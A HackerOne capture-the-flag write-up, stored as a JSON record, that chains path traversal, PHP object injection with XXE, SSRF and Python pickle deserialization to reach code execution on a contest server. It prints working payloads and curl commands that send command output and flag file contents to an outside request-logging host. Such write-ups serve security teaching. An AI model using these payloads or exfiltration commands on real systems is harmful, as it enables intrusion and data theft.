{"id":415202,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTUyMDI=","url":"https://hackerone.com/reports/415202","title":"Flag WriteUp","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-09-27T08:27:35.942Z","submitted_at":"2018-09-27T08:27:35.942Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"caioluders","url":"/caioluders","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":33314,"url":"https://hackerone.com/h1-5411-ctf","handle":"h1-5411-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-5411-CTF","twitter_handle":null,"website":"http://tbd.com","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-10-22T17:06:23.721Z","bug_reporter_agreed_on_going_public_at":"2018-10-22T17:06:23.654Z","team_member_agreed_on_going_public_at":"2018-10-22T16:02:31.257Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello everyone , here is my writeup :\n\n## Intro\nFirst I decoded the QR Code of the [tweet](https://twitter.com/Hacker0x01/status/1045075889120268289) , decoding to `Here you go: 68747470733a2f2f68312d353431312e68316374662e636f6d` . Decoding the hex value we get the challenge URL : https://h1-5411.h1ctf.com\n\n## Path traversal + local file read\n\nOn the website I found two important endpoints : /generate.php and /memes.php . At the generate.php I started doing some \"manual fuzzing\" trying some command injection, like `;)'\";|id`, and template injections like `{{7*7}}` but nothing seemed to work. \nAnalyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works ! And I got the first vulnerability .\n\nPath Traversal in `template` parameter\n```\n$ curl 'https://h1-5411.h1ctf.com/api/generate.php' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://h1-5411.h1ctf.com/generate.php' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=xxx' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\u0026type=text\u0026top-text=a\u0026bottom-text=b'\n{\"meme_path\":\"..\\/data\\/memes\\/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt\"}\n```\n/etc/passwd output\n```\n$ curl 'https://h1-5411.h1ctf.com/data/memes/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt'\n  A\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu6488:x:6488:6488:,,,:/app:/bin/bash\ndyno:x:6488:6488:,,,:/app:/bin/bash\n\n  B\n```\n\nFirst I tried reading some default configurations files like /proc/self/environ and /proc/self/cmdline without any usable information.\nNow with file read I can read all the source code of the application. The default /var/www/html/index.php path works fine, that's good news ! Following the path I read generate.php and memes.php, followed by /includes/config.php and /includes/classes.php.\nOn classes.php we can see that's a class called `ConfigFile` that is not used anywhere and that the code enable external entities on XML with `libxml_disable_entity_loader(false);` showing that the next step is probably a XXE. \nWhile trying to figure out the next step I remembered that I haven't looked at the /includes/header.php file because I thought that it was useless. Turns out that it has the endpoints import_memes_2.0.php and export_memes_2.0.php on it's comments. \n\n## Object Injection + XXE + SSRF\nLooking at /api/import_memes_2.0.php it's visible that it receives a file that is base64 encoded and unserialize it. After that, it merges with the `$_SESSION['memes']` array. Now I have a clear way to Object Injection into the `ConfigFile` class, but how to exploit it?\nHaving in mind that we need to get a XXE somewhere, it's clear that we need to call the `parse` function in the class and initialize the class with the `$url` variable being the malicious XXE payload. The `parse` function is only called by `generate` and `__toString` , the latter is a magic function that is called whenever the class is interpreted as a string and that occurs on `memes.php` on the foreach loop.\n\nNow I have a idea how to exploit it.\nCreate a serialized array, because of the `array_merge()` , with an `ConfigFile` class initialized with a malicious XXE payload.\nAs it was late of night and I was really tired, I just created all by hand counting the length of the string and all.\n\nThe serialized class without the payload looks like this :\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:2:\"ab\";}}\n```\nNow I have to insert the XXE payload, note that it must have `toptext` or a `bottomtext` tag to output the result to the page, at first I tried a RCE payload with `expect://`.\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:167:\"\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e\n\u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e\n\u003c!ENTITY xxe SYSTEM \"expect://id\" \u003e]\u003e\n\u003cpayload\u003e\n    \u003ctoptext\u003e\u0026xxe;\u003c/toptext\u003e\n\u003c/payload\u003e\";}}\n```\nBut no output was generated, after that I tried to output the stdout to a server with `expect://curl http://requestbin.net/r/w8rpj9w8?a=$(id)` with no success. Turns out that to expect works the module must be loaded on the PHP.\nNow the only thing I can think is a SSRF, as I already have local file read. The next payload is a attempt to get the content of http://google.com\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:174:\"\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e\n\u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e\n\u003c!ENTITY xxe SYSTEM \"http://google.com\" \u003e]\u003e\n\u003cpayload\u003e\n    \u003ctoptext\u003e\u0026xxe;\u003c/topttext\u003e\n\u003c/payload\u003e\";}}\n```\nBut it failed again. As I couldn't think of any other way to complete the challenge, I tried another technique to achieve SSRF with `php://filter/read=convert.base64-encode/resource=http://google.com`.\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:222:\"\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e\n\u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e\n\u003c!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://google.com\" \u003e]\u003e\n\u003cpayload\u003e\n    \u003ctoptext\u003e\u0026xxe;\u003c/toptext\u003e\n\u003c/payload\u003e\";}}\n```\nAnd now it worked ! The base64 result was printed on the memes.php page, now I have SSRF.\nAfter that I tried the AWS metadata URL http://169.254.169.254/latest/user-data/ , because the server was on AWS to try to get any credentials, but it didn't work.\n\nSo it must be a internal IP. To find the IP:PORT I used the first local file read to read /proc/net/tcp \n```\nsl  local_address rem_address   st tx_queue rx_queue tr tm-\u003ewhen retrnsmt   uid  timeout inode                                                     \n   0: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  6488        0 2574392220 1 0000000000000000 100 0 0 10 0                \n   1: 9E3610AC:A862 5579F868:0016 01 00000000:00000000 02:000A25B2 00000000  6488        0 2574386053 2 0000000000000000 20 4 29 10 -1\n```\nDecoding the hex `0100007F:0539` we get 127.0.0.1:1337, so this must be the next step.\n\n## Pickle injection RCE\nUsing the SSRF to get the http://127.0.0.1:1337.\n```\nMeme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging;\n```\nhttp://127.0.0.1:1337/status?debug=1\n```\nMaintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4\n```\nSending the `?debug=1` to /status it shows a Python's Pickle serialized data encoded in base64.\n```\n(iapp\nStatus\np1\n(dp2\nS'message'\np3\nS'Maintenance mode: off'\np4\nsS'maintenance'\np5\nI00\ns\n```\nhttp://127.0.0.1:1337/update-status?debug=1\n```\nMissing status parameter\n```\nSo we have to send a status parameter\n\nhttp://127.0.0.1:1337/update-status?debug=1\u0026status=hacked\n```\nInvalid status | Debug: Incorrect paddi\n```\nI tried to send the base64 he outputs on  the /status and it worked ! So I have to send a base64 encoded pickle object on the status parameter. \n\nPickle is notorious vulnerable to RCE, so I tried a simple exploit available at https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14.\n```\n$ python pick.py | base64\nY3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg==\n```\nSending this to `/update-status?debug=1\u0026status=Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg%3D%3D` showed\n```\nA new status has been loaded. Automatic reloading not implemented yet\n```\nBut no output. Changing the command to `curl http://requestbin.net/r/w8rpj9w8?c=$(id|base64)` sended the output to my server in a get .\n```\ndWlkPTEwMDAoaGFja2VyKSBnaWQ9MTAwMChoYWNrZXIpIGdyb3Vwcz0xMDAwKGhhY2tlcikK\n$ pbpaste | base64 --decode\nuid=1000(hacker) gid=1000(hacker) groups=1000(hacker)\n```\nTrying now a `$(ls|base64)`\n```\napp.py\napp.pyc\nflag.txt\nrequirements.txt\nstatic\nstatus.pi\n```\nAnd a `$(cat flag.txt|base64)`\n```\nYay! Here is your flag:\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_\n```\nFor some reason the base64 is cutted out, but sending a sed command to get the third line `curl -d $(sed -n 3p flag.txt|base64) http://requestbin.net/r/w8rpj9w8` I get all the flag.\n```\nflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n```\n\n## Impact\n\nThe impact of the challenge is to get me a ticket to h1-5411","vulnerability_information_html":"\u003cp\u003eHello everyone , here is my writeup :\u003c/p\u003e\n\n\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\n\u003cp\u003eFirst I decoded the QR Code of the \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1045075889120268289\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e , decoding to \u003ccode\u003eHere you go: 68747470733a2f2f68312d353431312e68316374662e636f6d\u003c/code\u003e . Decoding the hex value we get the challenge URL : \u003ca title=\"https://h1-5411.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fh1-5411.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-5411.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"path-traversal-local-file-read\"\u003ePath traversal + local file read\u003c/h2\u003e\n\n\u003cp\u003eOn the website I found two important endpoints : /generate.php and /memes.php . At the generate.php I started doing some \u0026quot;manual fuzzing\u0026quot; trying some command injection, like \u003ccode\u003e;)\u0026#39;\u0026quot;;|id\u003c/code\u003e, and template injections like \u003ccode\u003e{{7*7}}\u003c/code\u003e but nothing seemed to work. \u003cbr\u003e\nAnalyzing the requests I see that the \u003ccode\u003etemplate\u003c/code\u003e parameter value is a filename , so I try a path traversal with \u003ccode\u003e../../../../../../../etc/passwd\u003c/code\u003e and I get rick rolled :\u0026#39;( But changing the parameter \u003ccode\u003etype\u003c/code\u003e to \u003ccode\u003etext\u003c/code\u003e works ! And I got the first vulnerability .\u003c/p\u003e\n\n\u003cp\u003ePath Traversal in \u003ccode\u003etemplate\u003c/code\u003e parameter\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl \u0026#39;https://h1-5411.h1ctf.com/api/generate.php\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:64.0) Gecko/20100101 Firefox/64.0\u0026#39; -H \u0026#39;Accept: */*\u0026#39; -H \u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; --compressed -H \u0026#39;Referer: https://h1-5411.h1ctf.com/generate.php\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded;charset=UTF-8\u0026#39; -H \u0026#39;X-Requested-With: XMLHttpRequest\u0026#39; -H \u0026#39;DNT: 1\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Cookie: PHPSESSID=xxx\u0026#39; -H \u0026#39;Pragma: no-cache\u0026#39; -H \u0026#39;Cache-Control: no-cache\u0026#39; --data \u0026#39;template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\u0026amp;type=text\u0026amp;top-text=a\u0026amp;bottom-text=b\u0026#39;\n{\u0026quot;meme_path\u0026quot;:\u0026quot;..\\/data\\/memes\\/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e/etc/passwd output\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl \u0026#39;https://h1-5411.h1ctf.com/data/memes/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt\u0026#39;\n  A\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu6488:x:6488:6488:,,,:/app:/bin/bash\ndyno:x:6488:6488:,,,:/app:/bin/bash\n\n  B\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFirst I tried reading some default configurations files like /proc/self/environ and /proc/self/cmdline without any usable information.\u003cbr\u003e\nNow with file read I can read all the source code of the application. The default /var/www/html/index.php path works fine, that\u0026#39;s good news ! Following the path I read generate.php and memes.php, followed by /includes/config.php and /includes/classes.php.\u003cbr\u003e\nOn classes.php we can see that\u0026#39;s a class called \u003ccode\u003eConfigFile\u003c/code\u003e that is not used anywhere and that the code enable external entities on XML with \u003ccode\u003elibxml_disable_entity_loader(false);\u003c/code\u003e showing that the next step is probably a XXE. \u003cbr\u003e\nWhile trying to figure out the next step I remembered that I haven\u0026#39;t looked at the /includes/header.php file because I thought that it was useless. Turns out that it has the endpoints import_memes_2.0.php and export_memes_2.0.php on it\u0026#39;s comments. \u003c/p\u003e\n\n\u003ch2 id=\"object-injection-xxe-ssrf\"\u003eObject Injection + XXE + SSRF\u003c/h2\u003e\n\n\u003cp\u003eLooking at /api/import_memes_2.0.php it\u0026#39;s visible that it receives a file that is base64 encoded and unserialize it. After that, it merges with the \u003ccode\u003e$_SESSION[\u0026#39;memes\u0026#39;]\u003c/code\u003e array. Now I have a clear way to Object Injection into the \u003ccode\u003eConfigFile\u003c/code\u003e class, but how to exploit it?\u003cbr\u003e\nHaving in mind that we need to get a XXE somewhere, it\u0026#39;s clear that we need to call the \u003ccode\u003eparse\u003c/code\u003e function in the class and initialize the class with the \u003ccode\u003e$url\u003c/code\u003e variable being the malicious XXE payload. The \u003ccode\u003eparse\u003c/code\u003e function is only called by \u003ccode\u003egenerate\u003c/code\u003e and \u003ccode\u003e__toString\u003c/code\u003e , the latter is a magic function that is called whenever the class is interpreted as a string and that occurs on \u003ccode\u003ememes.php\u003c/code\u003e on the foreach loop.\u003c/p\u003e\n\n\u003cp\u003eNow I have a idea how to exploit it.\u003cbr\u003e\nCreate a serialized array, because of the \u003ccode\u003earray_merge()\u003c/code\u003e , with an \u003ccode\u003eConfigFile\u003c/code\u003e class initialized with a malicious XXE payload.\u003cbr\u003e\nAs it was late of night and I was really tired, I just created all by hand counting the length of the string and all.\u003c/p\u003e\n\n\u003cp\u003eThe serialized class without the payload looks like this :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:3:{i:0;O:10:\u0026quot;ConfigFile\u0026quot;:1:{s:10:\u0026quot;config_raw\u0026quot;;s:2:\u0026quot;ab\u0026quot;;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I have to insert the XXE payload, note that it must have \u003ccode\u003etoptext\u003c/code\u003e or a \u003ccode\u003ebottomtext\u003c/code\u003e tag to output the result to the page, at first I tried a RCE payload with \u003ccode\u003eexpect://\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:3:{i:0;O:10:\u0026quot;ConfigFile\u0026quot;:1:{s:10:\u0026quot;config_raw\u0026quot;;s:167:\u0026quot;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;ISO-8859-1\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt;\n\u0026lt;!ENTITY xxe SYSTEM \u0026quot;expect://id\u0026quot; \u0026gt;]\u0026gt;\n\u0026lt;payload\u0026gt;\n    \u0026lt;toptext\u0026gt;\u0026amp;xxe;\u0026lt;/toptext\u0026gt;\n\u0026lt;/payload\u0026gt;\u0026quot;;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut no output was generated, after that I tried to output the stdout to a server with \u003ccode\u003eexpect://curl http://requestbin.net/r/w8rpj9w8?a=$(id)\u003c/code\u003e with no success. Turns out that to expect works the module must be loaded on the PHP.\u003cbr\u003e\nNow the only thing I can think is a SSRF, as I already have local file read. The next payload is a attempt to get the content of \u003ca title=\"http://google.com\" href=\"/redirect?url=http%3A%2F%2Fgoogle.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://google.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:3:{i:0;O:10:\u0026quot;ConfigFile\u0026quot;:1:{s:10:\u0026quot;config_raw\u0026quot;;s:174:\u0026quot;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;ISO-8859-1\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt;\n\u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://google.com\u0026quot; \u0026gt;]\u0026gt;\n\u0026lt;payload\u0026gt;\n    \u0026lt;toptext\u0026gt;\u0026amp;xxe;\u0026lt;/topttext\u0026gt;\n\u0026lt;/payload\u0026gt;\u0026quot;;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut it failed again. As I couldn\u0026#39;t think of any other way to complete the challenge, I tried another technique to achieve SSRF with \u003ccode\u003ephp://filter/read=convert.base64-encode/resource=http://google.com\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:3:{i:0;O:10:\u0026quot;ConfigFile\u0026quot;:1:{s:10:\u0026quot;config_raw\u0026quot;;s:222:\u0026quot;\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;ISO-8859-1\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt;\n\u0026lt;!ENTITY xxe SYSTEM \u0026quot;php://filter/read=convert.base64-encode/resource=http://google.com\u0026quot; \u0026gt;]\u0026gt;\n\u0026lt;payload\u0026gt;\n    \u0026lt;toptext\u0026gt;\u0026amp;xxe;\u0026lt;/toptext\u0026gt;\n\u0026lt;/payload\u0026gt;\u0026quot;;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd now it worked ! The base64 result was printed on the memes.php page, now I have SSRF.\u003cbr\u003e\nAfter that I tried the AWS metadata URL \u003ca title=\"http://169.254.169.254/latest/user-data/\" href=\"/redirect?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fuser-data%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://169.254.169.254/latest/user-data/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e , because the server was on AWS to try to get any credentials, but it didn\u0026#39;t work.\u003c/p\u003e\n\n\u003cp\u003eSo it must be a internal IP. To find the IP:PORT I used the first local file read to read /proc/net/tcp \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esl  local_address rem_address   st tx_queue rx_queue tr tm-\u0026gt;when retrnsmt   uid  timeout inode                                                     \n   0: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  6488        0 2574392220 1 0000000000000000 100 0 0 10 0                \n   1: 9E3610AC:A862 5579F868:0016 01 00000000:00000000 02:000A25B2 00000000  6488        0 2574386053 2 0000000000000000 20 4 29 10 -1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecoding the hex \u003ccode\u003e0100007F:0539\u003c/code\u003e we get 127.0.0.1:1337, so this must be the next step.\u003c/p\u003e\n\n\u003ch2 id=\"pickle-injection-rce\"\u003ePickle injection RCE\u003c/h2\u003e\n\n\u003cp\u003eUsing the SSRF to get the \u003ca title=\"http://127.0.0.1:1337\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1337\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1337\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eMeme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca title=\"http://127.0.0.1:1337/status?debug=1\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1337%2Fstatus%3Fdebug%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1337/status?debug=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eMaintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSending the \u003ccode\u003e?debug=1\u003c/code\u003e to /status it shows a Python\u0026#39;s Pickle serialized data encoded in base64.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(iapp\nStatus\np1\n(dp2\nS\u0026#39;message\u0026#39;\np3\nS\u0026#39;Maintenance mode: off\u0026#39;\np4\nsS\u0026#39;maintenance\u0026#39;\np5\nI00\ns\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca title=\"http://127.0.0.1:1337/update-status?debug=1\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1337%2Fupdate-status%3Fdebug%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1337/update-status?debug=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eMissing status parameter\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we have to send a status parameter\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://127.0.0.1:1337/update-status?debug=1\u0026amp;status=hacked\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A1337%2Fupdate-status%3Fdebug%3D1%26status%3Dhacked\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:1337/update-status?debug=1\u0026amp;status=hacked\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eInvalid status | Debug: Incorrect paddi\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI tried to send the base64 he outputs on  the /status and it worked ! So I have to send a base64 encoded pickle object on the status parameter. \u003c/p\u003e\n\n\u003cp\u003ePickle is notorious vulnerable to RCE, so I tried a simple exploit available at \u003ca title=\"https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2F0xBADCA7%2Ff4c700fcbb5fb8785c14\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ python pick.py | base64\nY3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSending this to \u003ccode\u003e/update-status?debug=1\u0026amp;status=Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg%3D%3D\u003c/code\u003e showed\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eA new status has been loaded. Automatic reloading not implemented yet\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut no output. Changing the command to \u003ccode\u003ecurl http://requestbin.net/r/w8rpj9w8?c=$(id|base64)\u003c/code\u003e sended the output to my server in a get .\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edWlkPTEwMDAoaGFja2VyKSBnaWQ9MTAwMChoYWNrZXIpIGdyb3Vwcz0xMDAwKGhhY2tlcikK\n$ pbpaste | base64 